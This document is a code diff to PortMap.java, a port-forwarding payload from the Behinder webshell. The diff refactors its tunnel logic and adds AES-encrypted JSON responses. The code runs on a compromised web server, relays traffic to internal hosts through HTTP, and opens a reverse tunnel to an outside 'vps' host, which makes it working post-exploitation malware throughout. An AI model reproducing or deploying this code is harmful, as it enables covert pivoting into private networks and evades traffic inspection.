@@ -1,13 +1,20 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
 import java.net.InetSocketAddress;
 import java.nio.ByteBuffer;
 import java.nio.channels.SocketChannel;
+import java.util.Arrays;
 import java.util.Enumeration;
+import java.util.HashMap;
+import java.util.Iterator;
 import java.util.Map;
+import java.util.Random;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 
 public class PortMap implements Runnable {
    public static String action;
@@ -26,135 +33,162 @@ public class PortMap implements Runnable {
    Object httpSession;
 
    public boolean equals(Object obj) {
+      HashMap result = new HashMap();
+      boolean var14 = false;
+
+      Object so;
+      Method write;
+      label157: {
+         try {
+            var14 = true;
+            this.fillContext(obj);
+            String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
+            if (action.equals("createLocal")) {
+               this.createTunnel(localSessionKey);
+               var14 = false;
+            } else if (action.equals("read")) {
+               byte[] data = this.doRead(localSessionKey);
+               result.put("status", "success");
+               result.put("msg", base64encode(data));
+               var14 = false;
+            } else if (action.equals("write")) {
+               this.doWrite(localSessionKey);
+               result.put("status", "success");
+               result.put("msg", "ok");
+               var14 = false;
+            } else if (action.equals("closeLocal")) {
+               this.closeLocal();
+               result.put("status", "success");
+               result.put("msg", "ok");
+               var14 = false;
+            } else if (action.equals("createRemote")) {
+               (new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session))).start();
+               result.put("status", "success");
+               result.put("msg", "ok");
+               var14 = false;
+            } else if (!action.equals("closeRemote")) {
+               var14 = false;
+            } else {
+               this.sessionSetAttribute(this.Session, "remoteRunning", false);
+               Enumeration attributeNames = this.sessionGetAttributeNames(this.Session);
+
+               while(attributeNames.hasMoreElements()) {
+                  String attrName = attributeNames.nextElement().toString();
+                  if (attrName.startsWith("remote")) {
+                     this.sessionRemoveAttribute(this.Session, attrName);
+                  }
+               }
+
+               result.put("status", "success");
+               result.put("msg", "ok");
+               var14 = false;
+            }
+            break label157;
+         } catch (Exception var18) {
+            var18.printStackTrace();
+            result.put("status", "fail");
+            result.put("msg", var18.getMessage());
+            var14 = false;
+         } finally {
+            if (var14) {
+               try {
+                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getMethod("flush").invoke(so);
+                  so.getClass().getMethod("close").invoke(so);
+               } catch (Exception var15) {
+                  var15.printStackTrace();
+               }
+
+            }
+         }
+
+         try {
+            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getMethod("flush").invoke(so);
+            so.getClass().getMethod("close").invoke(so);
+         } catch (Exception var16) {
+            var16.printStackTrace();
+         }
+
+         return true;
+      }
+
       try {
-         this.fillContext(obj);
-         this.portMap();
-      } catch (Exception var3) {
+         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         so.getClass().getMethod("flush").invoke(so);
+         so.getClass().getMethod("close").invoke(so);
+      } catch (Exception var17) {
+         var17.printStackTrace();
       }
 
       return true;
    }
 
-   public void portMap() throws Exception {
-      String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
-      if (action.equals("createLocal")) {
-         try {
-            String target = targetIP;
-            int port = Integer.parseInt(targetPort);
-            SocketChannel socketChannel = SocketChannel.open();
-            socketChannel.connect(new InetSocketAddress(target, port));
-            socketChannel.configureBlocking(false);
-            this.sessionSetAttribute(this.Session, localSessionKey, socketChannel);
-            this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
-         } catch (Exception var10) {
-            Exception e = var10;
+   private void createTunnel(String localSessionKey) throws Exception {
+      String target = targetIP;
+      int port = Integer.parseInt(targetPort);
+      SocketChannel socketChannel = SocketChannel.open();
+      socketChannel.connect(new InetSocketAddress(target, port));
+      socketChannel.configureBlocking(false);
+      this.sessionSetAttribute(this.Session, localSessionKey, socketChannel);
+   }
 
-            try {
-               Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
-               Method write = so.getClass().getMethod("write", byte[].class);
-               write.invoke(so, new byte[]{55, 33, 73, 54});
-               write.invoke(so, e.getMessage().getBytes());
-               so.getClass().getMethod("flush").invoke(so);
-               so.getClass().getMethod("close").invoke(so);
-            } catch (Exception var9) {
-               var9.printStackTrace();
-            }
-         }
-      } else {
-         Method write;
-         SocketChannel socketChannel;
-         Exception e;
-         Object so;
-         if (action.equals("read")) {
-            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
-            if (socketChannel == null) {
-               return;
-            }
+   private byte[] doRead(String localSessionKey) throws Exception {
+      SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
+      if (socketChannel == null) {
+         this.createTunnel(localSessionKey);
+      }
 
-            try {
-               ByteBuffer buf = ByteBuffer.allocate(512);
-               socketChannel.configureBlocking(false);
-               int bytesRead = socketChannel.read(buf);
-               so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+      socketChannel.configureBlocking(false);
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      ByteBuffer buf = ByteBuffer.allocate(512);
 
-               for(write = so.getClass().getMethod("write", byte[].class, Integer.TYPE, Integer.TYPE); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
-                  write.invoke(so, buf.array(), 0, bytesRead);
-                  so.getClass().getMethod("flush").invoke(so);
-                  buf.clear();
-               }
+      int length;
+      for(length = socketChannel.read(buf); length > 0; length = socketChannel.read(buf)) {
+         byte[] data = Arrays.copyOfRange(buf.array(), 0, length);
+         buf.clear();
+         bos.write(data);
+      }
 
-               so.getClass().getMethod("flush").invoke(so);
-               so.getClass().getMethod("close").invoke(so);
-            } catch (Exception var12) {
-               e = var12;
-               this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
+      if (length == -1) {
+         socketChannel.close();
+         this.createTunnel(localSessionKey);
+      }
 
-               try {
-                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
-                  write = so.getClass().getMethod("write", byte[].class);
-                  write.invoke(so, new byte[]{55, 33, 73, 54});
-                  write.invoke(so, e.getMessage().getBytes());
-                  so.getClass().getMethod("flush").invoke(so);
-                  so.getClass().getMethod("close").invoke(so);
-                  socketChannel.socket().close();
-               } catch (IOException var8) {
-                  var8.printStackTrace();
-               }
-            }
-         } else if (action.equals("write")) {
-            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
+      return bos.toByteArray();
+   }
 
-            try {
-               byte[] extraDataByte = this.base64decode(extraData);
-               ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
-               buf.clear();
-               buf.put(extraDataByte);
-               buf.flip();
+   private void doWrite(String localSessionKey) throws Exception {
+      SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
+      if (socketChannel == null) {
+         this.createTunnel(localSessionKey);
+      }
 
-               while(buf.hasRemaining()) {
-                  socketChannel.write(buf);
-               }
-            } catch (Exception var11) {
-               e = var11;
+      byte[] extraDataByte = this.base64decode(extraData);
+      ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
+      buf.clear();
+      buf.put(extraDataByte);
+      buf.flip();
 
-               try {
-                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
-                  write = so.getClass().getMethod("write", byte[].class);
-                  write.invoke(so, new byte[]{55, 33, 73, 54});
-                  write.invoke(so, e.getMessage().getBytes());
-                  so.getClass().getMethod("flush").invoke(so);
-                  so.getClass().getMethod("close").invoke(so);
-                  socketChannel.socket().close();
-               } catch (IOException var7) {
-                  var7.printStackTrace();
-               }
-            }
-         } else {
-            Enumeration attributeNames;
-            String attrName;
-            if (action.equals("closeLocal")) {
-               attributeNames = this.sessionGetAttributeNames(this.Session);
+      while(buf.hasRemaining()) {
+         socketChannel.write(buf);
+      }
 
-               while(attributeNames.hasMoreElements()) {
-                  attrName = attributeNames.nextElement().toString();
-                  if (attrName.startsWith("local_")) {
-                     this.sessionRemoveAttribute(this.Session, attrName);
-                  }
-               }
-            } else if (action.equals("createRemote")) {
-               (new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session))).start();
-               this.Response.getClass().getMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
-            } else if (action.equals("closeRemote")) {
-               this.sessionSetAttribute(this.Session, "remoteRunning", false);
-               attributeNames = this.sessionGetAttributeNames(this.Session);
+   }
 
-               while(attributeNames.hasMoreElements()) {
-                  attrName = attributeNames.nextElement().toString();
-                  if (attrName.startsWith("remote")) {
-                     this.sessionRemoveAttribute(this.Session, attrName);
-                  }
-               }
-            }
+   private void closeLocal() {
+      Enumeration attributeNames = this.sessionGetAttributeNames(this.Session);
+
+      while(attributeNames.hasMoreElements()) {
+         String attrName = attributeNames.nextElement().toString();
+         if (attrName.startsWith("local_")) {
+            this.sessionRemoveAttribute(this.Session, attrName);
          }
       }
 
@@ -185,20 +219,20 @@ public class PortMap implements Runnable {
                remoteSocketChannel.connect(new InetSocketAddress(vps, bytesRead));
                String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                this.sessionSetAttribute(this.httpSession, remoteKey, remoteSocketChannel);
-               ByteBuffer buf = ByteBuffer.allocate(512);
-               if ((bytesRead = remoteSocketChannel.read(buf)) > 0) {
-                  remoteSocketChannel.configureBlocking(true);
-                  SocketChannel localSocketChannel = SocketChannel.open();
-                  localSocketChannel.connect(new InetSocketAddress(target, port));
-                  localSocketChannel.configureBlocking(true);
-                  String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
-                  this.sessionSetAttribute(this.httpSession, localKey, localSocketChannel);
-                  localSocketChannel.socket().getOutputStream().write(buf.array(), 0, bytesRead);
-                  (new Thread(new PortMap(localKey, remoteKey, "read", this.httpSession))).start();
-                  (new Thread(new PortMap(localKey, remoteKey, "write", this.httpSession))).start();
+               remoteSocketChannel.configureBlocking(true);
+               SocketChannel localSocketChannel = SocketChannel.open();
+               localSocketChannel.connect(new InetSocketAddress(target, port));
+               localSocketChannel.configureBlocking(true);
+               String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
+               this.sessionSetAttribute(this.httpSession, localKey, localSocketChannel);
+               (new Thread(new PortMap(localKey, remoteKey, "read", this.httpSession))).start();
+               (new Thread(new PortMap(localKey, remoteKey, "write", this.httpSession))).start();
+            } catch (Exception var12) {
+               try {
+                  Thread.sleep(3000L);
+               } catch (InterruptedException var11) {
+                  var11.printStackTrace();
                }
-            } catch (Exception var13) {
-               var13.printStackTrace();
             }
          }
       } else {
@@ -223,10 +257,10 @@ public class PortMap implements Runnable {
 
                      so.flush();
                      so.close();
-                  } catch (IOException var14) {
+                  } catch (IOException var13) {
                      try {
                         Thread.sleep(10L);
-                     } catch (Exception var11) {
+                     } catch (Exception var9) {
                      }
                   }
                }
@@ -247,10 +281,10 @@ public class PortMap implements Runnable {
 
                   so.flush();
                   so.close();
-               } catch (IOException var15) {
+               } catch (IOException var14) {
                   try {
                      Thread.sleep(10L);
-                  } catch (Exception var12) {
+                  } catch (Exception var10) {
                   }
                }
             }
@@ -342,5 +376,86 @@ public class PortMap implements Runnable {
       write.invoke(so, data);
       so.getClass().getMethod("flush").invoke(so);
       so.getClass().getMethod("close").invoke(so);
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
+   }
+
+   private byte[] Encrypt(byte[] bs) throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      byte[] raw = key.getBytes("utf-8");
+      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
+      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+      cipher.init(1, skeySpec);
+      byte[] encrypted = cipher.doFinal(bs);
+      return encrypted;
+   }
+
+   private String buildJson(Map entity, boolean encode) throws Exception {
+      StringBuilder sb = new StringBuilder();
+      String version = System.getProperty("java.version");
+      sb.append("{");
+      Iterator var5 = entity.keySet().iterator();
+
+      while(var5.hasNext()) {
+         String key = (String)var5.next();
+         sb.append("\"" + key + "\":\"");
+         String value = ((String)entity.get(key)).toString();
+         if (encode) {
+            Class Base64;
+            Object Encoder;
+            if (version.compareTo("1.9") >= 0) {
+               this.getClass();
+               Base64 = Class.forName("java.util.Base64");
+               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
+            } else {
+               this.getClass();
+               Base64 = Class.forName("sun.misc.BASE64Encoder");
+               Encoder = Base64.newInstance();
+               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
+               value = value.replace("\n", "").replace("\r", "");
+            }
+         }
+
+         sb.append(value);
+         sb.append("\",");
+      }
+
+      if (sb.toString().endsWith(",")) {
+         sb.setLength(sb.length() - 1);
+      }
+
+      sb.append("}");
+      return sb.toString();
+   }
+
+   private static String base64encode(byte[] content) throws Exception {
+      String result = "";
+      String version = System.getProperty("java.version");
+      Class Base64;
+      Object Encoder;
+      if (version.compareTo("1.9") >= 0) {
+         Base64 = Class.forName("java.util.Base64");
+         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content);
+      } else {
+         Base64 = Class.forName("sun.misc.BASE64Encoder");
+         Encoder = Base64.newInstance();
+         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content);
+         result = result.replace("\n", "").replace("\r", "");
+      }
+
+      return result;
    }
 }
